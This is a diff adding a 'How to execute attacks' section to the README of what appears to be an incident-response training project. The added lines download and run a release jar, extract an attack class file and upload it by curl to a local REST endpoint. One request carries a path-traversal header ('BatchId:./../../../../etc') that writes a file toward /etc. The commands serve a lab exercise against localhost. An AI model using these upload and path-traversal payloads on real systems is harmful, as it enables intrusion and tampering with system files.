@@ -19,3 +19,17 @@ What did devops do wrong?
 ![Alt text](howto-03.png?raw=true "Howto 03")
 
 ![Alt text](howto-04.png?raw=true "Howto 04")
+
+## How to execute attacks:
+wget https://github.com/kubaseai/irre/releases/download/0.0.1/incident-response-readiness-excercises-0.0.1-SNAPSHOT.jar
+
+java -cp in*.jar DevUI
+
+nohup java -jar in*.jar &
+
+unzip incident-response-readiness-excercises-0.0.1-SNAPSHOT.jar BOOT-INF/classes/com/cybersecurity/incidentresponsereadinessexcercises/attacks/Financial.class
+
+curl -u devops:devops -vvv -X POST http://localhost:8080/rest/api/1.0/transaction/1 -T BOOT-INF/classes/com/cybersecurity/incidentresponsereadinessexcercises/attacks/Financial.class
+
+curl -u devops:devops -vvv -X POST http://localhost:8080/rest/api/1.0/transaction/profile -T babunia_ownz_you -H "BatchId:./../../../../../../../../../etc"
+
